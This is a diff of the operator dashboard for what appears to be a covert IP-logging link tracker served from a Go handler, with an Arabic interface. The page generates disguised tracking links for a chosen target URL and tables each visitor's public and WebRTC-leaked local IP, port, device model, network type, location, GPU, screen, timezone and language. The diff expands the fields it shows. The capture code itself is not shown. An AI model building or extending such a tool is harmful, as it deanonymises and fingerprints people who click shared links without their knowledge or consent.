     .search-result .row {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        padding: 6px 0;
-        border-bottom: 1px dashed #21262d;
-        flex-wrap: wrap;
-        gap: 8px;
+        display: flex; justify-content: space-between; align-items: center;
+        padding: 6px 0; border-bottom: 1px dashed #21262d;
+        flex-wrap: wrap; gap: 8px;
     }
     .search-result .row:last-child { border-bottom: none; }
     .search-result .key { color: #8b949e; font-size: 12px; }
-    .search-result .val { color: #c9d1d9; font-size: 12px; direction: ltr; text-align: left; }
-    .search-result .val.url { color: #58a6ff; word-break: break-all; max-width: 70%; }
+    .search-result .val { color: #c9d1d9; font-size: 12px; direction: ltr; text-align: left; word-break: break-all; max-width: 70%; }
     .search-error {
-        background: rgba(248, 81, 73, 0.1);
-        border: 1px solid #f85149;
-        color: #ff7b72;
-        padding: 10px;
-        border-radius: 6px;
-        margin-top: 12px;
-        font-size: 12px;
-        text-align: center;
+        background: rgba(248,81,73,.1); border: 1px solid #f85149;
+        color: #ff7b72; padding: 10px; border-radius: 6px;
+        margin-top: 12px; font-size: 12px; text-align: center;
     }
-    .search-loading { display: none; color: #d29922; font-size: 12px; margin-top: 8px; }
 
-    /* Table */
     .table-wrap {
-        width: 100%;
-        overflow-x: auto;
-        -webkit-overflow-scrolling: touch;
+        width: 100%; overflow-x: auto; -webkit-overflow-scrolling: touch;
         border-radius: 6px;
     }
-    table {
-        width: 100%;
-        min-width: 800px;
-        border-collapse: collapse;
-        font-size: 11px;
-        font-family: inherit;
-    }
-    th, td {
-        border: 1px solid #21262d;
-        padding: 8px 6px;
-        text-align: center;
-        white-space: nowrap;
-    }
+    table { width: 100%; min-width: 900px; border-collapse: collapse; font-size: 11px; font-family: inherit; }
+    th, td { border: 1px solid #21262d; padding: 8px 6px; text-align: center; white-space: nowrap; vertical-align: middle; }
     th {
-        background: #21262d;
-        color: #8b949e;
-        font-size: 10px;
-        text-transform: uppercase;
-        letter-spacing: 0.5px;
-        position: sticky;
-        top: 0;
+        background: #21262d; color: #8b949e; font-size: 10px;
+        text-transform: uppercase; letter-spacing: .5px; position: sticky; top: 0;
     }
-    tr:nth-child(even) td { background: rgba(22, 27, 34, 0.4); }
+    tr:nth-child(even) td { background: rgba(22,27,34,.4); }
     tr:hover td { background: #1c2128; }
     .cell-code { color: #58a6ff; font-weight: bold; }
     .cell-public { color: #7ee787; direction: ltr; }
     .cell-local { color: #d29922; direction: ltr; }
+    .cell-port { color: #d29922; direction: ltr; }
+    .cell-model { color: #ff7b72; }
+    .cell-net { color: #79c0ff; }
     .cell-location { color: #3fb950; }
-    .cell-device { color: #ff7b72; }
-    .cell-time { color: #8b949e; }
+    .cell-time { color: #8b949e; direction: ltr; }
 
-    /* Source badges */
     .src-badge {
-        display: inline-block;
-        padding: 2px 8px;
-        border-radius: 10px;
-        font-size: 10px;
-        font-weight: bold;
+        display: inline-block; padding: 2px 8px; border-radius: 10px;
+        font-size: 10px; font-weight: bold;
     }
-    .src-host  { background: rgba(63, 185, 80, 0.15); color: #3fb950; border: 1px solid #3fb950; }
-    .src-srflx { background: rgba(210, 153, 34, 0.15); color: #d29922; border: 1px solid #d29922; }
-    .src-relay { background: rgba(88, 166, 255, 0.15); color: #58a6ff; border: 1px solid #58a6ff; }
-    .src-mdns  { background: rgba(139, 148, 158, 0.15); color: #8b949e; border: 1px solid #484f58; }
-    .src-none  { background: rgba(110, 118, 129, 0.15); color: #6e7681; border: 1px solid #484f58; }
+    .src-host  { background: rgba(63,185,80,.15); color: #3fb950; border: 1px solid #3fb950; }
+    .src-srflx { background: rgba(210,153,34,.15); color: #d29922; border: 1px solid #d29922; }
+    .src-relay { background: rgba(88,166,255,.15); color: #58a6ff; border: 1px solid #58a6ff; }
+    .src-mdns  { background: rgba(139,148,158,.15); color: #8b949e; border: 1px solid #484f58; }
+    .src-none  { background: rgba(110,118,129,.15); color: #6e7681; border: 1px solid #484f58; }
 
-    /* Toast */
+    .details-row td {
+        background: #0d1117 !important;
+        padding: 12px !important;
+        text-align: right !important;
+        white-space: normal !important;
+    }
+    .details-grid {
+        display: grid; grid-template-columns: repeat(auto-fit, minmax(190px, 1fr));
+        gap: 8px; font-size: 11px;
+    }
+    .details-grid .k { color: #8b949e; }
+    .details-grid .v { color: #c9d1d9; direction: ltr; }
+
     .toast {
-        position: fixed;
-        bottom: 20px;
-        left: 50%;
+        position: fixed; bottom: 20px; left: 50%;
         transform: translateX(-50%) translateY(100px);
-        background: #238636;
-        color: #fff;
-        padding: 12px 24px;
-        border-radius: 8px;
-        font-size: 13px;
-        font-weight: bold;
-        box-shadow: 0 8px 24px rgba(0,0,0,0.6);
-        opacity: 0;
-        transition: all 0.3s ease;
-        z-index: 9999;
+        background: #238636; color: #fff; padding: 12px 24px;
+        border-radius: 8px; font-size: 13px; font-weight: bold;
+        box-shadow: 0 8px 24px rgba(0,0,0,.6);
+        opacity: 0; transition: all .3s ease; z-index: 9999;
     }
     .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
-
-    /* Empty state */
-    .empty {
-        text-align: center;
-        padding: 30px;
-        color: #484f58;
-        font-size: 12px;
-    }
+    .empty { text-align: center; padding: 30px; color: #484f58; font-size: 12px; }
 
     @media (max-width: 600px) {
         body { padding: 10px; }
         .stat-value { font-size: 20px; }
         .box { padding: 12px; }
-        .search-result .val.url { max-width: 100%; }
+        .search-result .val { max-width: 100%; }
     }
 </style>
 <script>
@@ -904,14 +886,17 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 
     function fallbackCopy(text, label) {
         const ta = document.createElement('textarea');
-        ta.value = text;
-        ta.style.position = 'fixed';
-        ta.style.opacity = '0';
-        document.body.appendChild(ta);
-        ta.select();
+        ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+        document.body.appendChild(ta); ta.select();
         try { document.execCommand('copy'); showToast('✓ ' + label + ' تم النسخ'); }
         catch (e) { showToast('✗ فشل النسخ'); }
         document.body.removeChild(ta);
+    }
+
+    function toggleDetails(id) {
+        const row = document.getElementById('details-' + id);
+        if (!row) return;
+        row.style.display = row.style.display === 'none' ? 'table-row' : 'none';
     }
 </script>
 </head>
@@ -919,11 +904,10 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 <div class="container">
 
     <div class="header">
-        <h1>// CODE_TERMINAL<span class="status-dot"></span></h1>
-        <span style="font-size:11px; color:#8b949e;">v2.0 · intelligence suite</span>
+        <h1><span class="status-dot"></span>// CODE_TERMINAL</h1>
+        <span style="font-size:11px;color:#8b949e;">v2.1 · intelligence suite</span>
     </div>
 
-    <!-- Stats -->
     <div class="stats">
         <div class="stat-card">
             <div class="stat-value">{{.Stats.TotalLinks}}</div>
@@ -939,32 +923,34 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
         </div>
     </div>
 
-    <!-- Create link -->
     <div class="box">
-        <h3 class="box-title"><span class="badge">01</span> توليد رابط تتبع جديد</h3>
+        <h3 class="box-title">توليد رابط تتبع جديد<span class="badge">01</span></h3>
         <form method="POST">
             <input type="text" name="target_url" placeholder="target_url  →  https://example.com/video" required autocomplete="off">
             <input type="text" name="custom_code" placeholder="custom_code (اختياري)" autocomplete="off">
             <button type="submit" class="btn-full">🚀 generate_link()</button>
         </form>
 
+        {{if .GenerateError}}
+        <div class="search-error">✗ {{.GenerateError}}</div>
+        {{end}}
+
         {{if .GeneratedLink}}
         <div class="result">
             <div class="result-label">✓ الرابط جاهز</div>
             <div class="result-value" id="genLink">{{.GeneratedLink}}</div>
-            <div style="font-size:11px; color:#8b949e; margin-bottom:6px;">كود التتبع:</div>
+            <div style="font-size:11px;color:#8b949e;margin-bottom:6px;">كود التتبع:</div>
             <div class="result-code" id="genCode">{{.GeneratedCode}}</div>
             <div class="btn-row" style="margin-top:6px;">
-                <button type="button" class="btn-blue" onclick="copyText(document.getElementById('genLink').innerText, 'الرابط')">📋 نسخ الرابط</button>
-                <button type="button" class="btn-blue" onclick="copyText(document.getElementById('genCode').innerText, 'الكود')">🏷️ نسخ الكود</button>
+                <button type="button" class="btn-blue" onclick="copyText(document.getElementById('genLink').innerText,'الرابط')">📋 نسخ الرابط</button>
+                <button type="button" class="btn-blue" onclick="copyText(document.getElementById('genCode').innerText,'الكود')">🏷️ نسخ الكود</button>
             </div>
         </div>
         {{end}}
     </div>
 
-    <!-- Search -->
     <div class="box">
-        <h3 class="box-title"><span class="badge">02</span> البحث عن رابط سابق بالكود</h3>
+        <h3 class="box-title">البحث عن رابط سابق بالكود<span class="badge">02</span></h3>
         <form method="GET" action="/">
             <input type="text" name="search" placeholder="أدخل كود التتبع (مثال: 12345678)" value="{{.SearchQuery}}" autocomplete="off">
             <button type="submit" class="btn-full btn-blue">🔍 search_link()</button>
@@ -978,11 +964,11 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
         <div class="search-result">
             <div class="row">
                 <span class="key">الكود</span>
-                <span class="val" style="color:#d29922; font-weight:bold;" id="searchCode">{{.SearchResult.Code}}</span>
+                <span class="val" style="color:#d29922;font-weight:bold;" id="searchCode">{{.SearchResult.Code}}</span>
             </div>
             <div class="row">
                 <span class="key">الرابط الأصلي</span>
-                <span class="val url">{{.SearchResult.TargetURL}}</span>
+                <span class="val" style="color:#58a6ff;">{{.SearchResult.TargetURL}}</span>
             </div>
             <div class="row">
                 <span class="key">تاريخ الإنشاء</span>
@@ -990,24 +976,23 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
             </div>
             <div class="row">
                 <span class="key">عدد الزيارات</span>
-                <span class="val" style="color:#3fb950; font-weight:bold;">{{.SearchResult.CaptureCount}}</span>
+                <span class="val" style="color:#3fb950;font-weight:bold;">{{.SearchResult.CaptureCount}}</span>
             </div>
             <div class="btn-row" style="margin-top:10px;">
-                <button type="button" class="btn-sm btn-blue" onclick="copyText(document.getElementById('searchCode').innerText, 'الكود')">🏷️ نسخ الكود</button>
-                <button type="button" class="btn-sm btn-ghost" onclick="window.location.href='/?r={{.SearchResult.Code}}'" target="_blank">🔗 فتح الرابط</button>
+                <button type="button" class="btn-sm btn-blue" onclick="copyText('{{.SearchResult.TrackerLink}}','رابط التتبع')">📋 نسخ رابط التتبع</button>
+                <button type="button" class="btn-sm btn-blue" onclick="copyText(document.getElementById('searchCode').innerText,'الكود')">🏷️ نسخ الكود</button>
+                <a href="{{.SearchResult.TargetURL}}" target="_blank" rel="noopener noreferrer" class="btn-sm btn-ghost" style="display:inline-block;padding:6px 10px;border-radius:6px;text-decoration:none;text-align:center;flex:1;min-width:130px;">🔗 فتح الهدف</a>
             </div>
         </div>
         {{end}}
     </div>
 
-    <!-- Captures table -->
     <div class="box">
         <h3 class="box-title">
-            <span class="badge">03</span>
             {{if .SearchResult}}
-                زيارات الكود <span style="color:#d29922;">{{.SearchResult.Code}}</span>
+                زيارات الكود <span style="color:#d29922;">{{.SearchResult.Code}}</span><span class="badge">03</span>
             {{else}}
-                آخر الزيارات المُسجَّلة
+                آخر الزيارات المُسجَّلة<span class="badge">03</span>
             {{end}}
         </h3>
 
@@ -1019,10 +1004,12 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
                         <th>Code</th>
                         <th>Public IP</th>
                         <th>Local IP</th>
-                        <th>Source</th>
-                        <th>ISP / Network</th>
-                        <th>Hardware &amp; OS</th>
-                        <th>Timestamp</th>
+                        <th>Port</th>
+                        <th>Model</th>
+                        <th>Net</th>
+                        <th>Location</th>
+                        <th>Time</th>
+                        <th>•••</th>
                     </tr>
                 </thead>
                 <tbody>
@@ -1032,14 +1019,29 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
                         <td class="cell-time">{{.ID}}</td>
                         <td class="cell-code">{{.Code}}</td>
                         <td class="cell-public">{{.PublicIP}}</td>
-                        <td class="cell-local">{{.LocalIP}}</td>
-                        <td><span class="src-badge src-{{.LocalIPSource}}">{{.LocalIPSource}}</span></td>
+                        <td class="cell-local">{{.LocalIP}}<br><span class="src-badge src-{{.LocalIPSource}}">{{.LocalIPSource}}</span></td>
+                        <td class="cell-port">{{.SourcePort}}</td>
+                        <td class="cell-model">{{.DeviceModel}}</td>
+                        <td class="cell-net">{{.NetworkType}}</td>
                         <td class="cell-location">{{.Location}}</td>
-                        <td class="cell-device">{{.DeviceInfo}}</td>
                         <td class="cell-time">{{.CreatedAt}}</td>
+                        <td><button class="btn-sm btn-ghost" onclick="toggleDetails({{.ID}})">▼</button></td>
+                    </tr>
+                    <tr id="details-{{.ID}}" class="details-row" style="display:none;">
+                        <td colspan="10">
+                            <div class="details-grid">
+                                <div><span class="k">GPU:</span> <span class="v">{{.GPU}}</span></div>
+                                <div><span class="k">Screen:</span> <span class="v">{{.ScreenInfo}}</span></div>
+                                <div><span class="k">Timezone:</span> <span class="v">{{.Timezone}}</span></div>
+                                <div><span class="k">Language:</span> <span class="v">{{.Language}}</span></div>
+                                <div><span class="k">Touch:</span> <span class="v">{{.TouchSupport}}</span></div>
+                                <div><span class="k">Source:</span> <span class="v">{{.LocalIPSource}}</span></div>
+                                <div style="grid-column:1/-1;"><span class="k">Device:</span> <span class="v">{{.DeviceInfo}}</span></div>
+                            </div>
+                        </td>
                     </tr>
                     {{else}}
-                    <tr><td colspan="8" class="empty">لا توجد زيارات مسجلة لهذا الكود بعد</td></tr>
+                    <tr><td colspan="10" class="empty">لا توجد زيارات مسجلة لهذا الكود بعد</td></tr>
                     {{end}}
                 {{else}}
                     {{range .Captures}}
@@ -1047,14 +1049,29 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
                         <td class="cell-time">{{.ID}}</td>
                         <td class="cell-code">{{.Code}}</td>
                         <td class="cell-public">{{.PublicIP}}</td>
-                        <td class="cell-local">{{.LocalIP}}</td>
-                        <td><span class="src-badge src-{{.LocalIPSource}}">{{.LocalIPSource}}</span></td>
+                        <td class="cell-local">{{.LocalIP}}<br><span class="src-badge src-{{.LocalIPSource}}">{{.LocalIPSource}}</span></td>
+                        <td class="cell-port">{{.SourcePort}}</td>
+                        <td class="cell-model">{{.DeviceModel}}</td>
+                        <td class="cell-net">{{.NetworkType}}</td>
                         <td class="cell-location">{{.Location}}</td>
-                        <td class="cell-device">{{.DeviceInfo}}</td>
                         <td class="cell-time">{{.CreatedAt}}</td>
+                        <td><button class="btn-sm btn-ghost" onclick="toggleDetails({{.ID}})">▼</button></td>
+                    </tr>
+                    <tr id="details-{{.ID}}" class="details-row" style="display:none;">
+                        <td colspan="10">
+                            <div class="details-grid">
+                                <div><span class="k">GPU:</span> <span class="v">{{.GPU}}</span></div>
+                                <div><span class="k">Screen:</span> <span class="v">{{.ScreenInfo}}</span></div>
+                                <div><span class="k">Timezone:</span> <span class="v">{{.Timezone}}</span></div>
+                                <div><span class="k">Language:</span> <span class="v">{{.Language}}</span></div>
+                                <div><span class="k">Touch:</span> <span class="v">{{.TouchSupport}}</span></div>
+                                <div><span class="k">Source:</span> <span class="v">{{.LocalIPSource}}</span></div>
+                                <div style="grid-column:1/-1;"><span class="k">Device:</span> <span class="v">{{.DeviceInfo}}</span></div>
+                            </div>
+                        </td>
                     </tr>
                     {{else}}
-                    <tr><td colspan="8" class="empty">لا توجد زيارات بعد — أنشئ رابطًا وشارك</td></tr>
+                    <tr><td colspan="10" class="empty">لا توجد زيارات بعد — أنشئ رابطًا وشارك</td></tr>
                     {{end}}
                 {{end}}
                 </tbody>
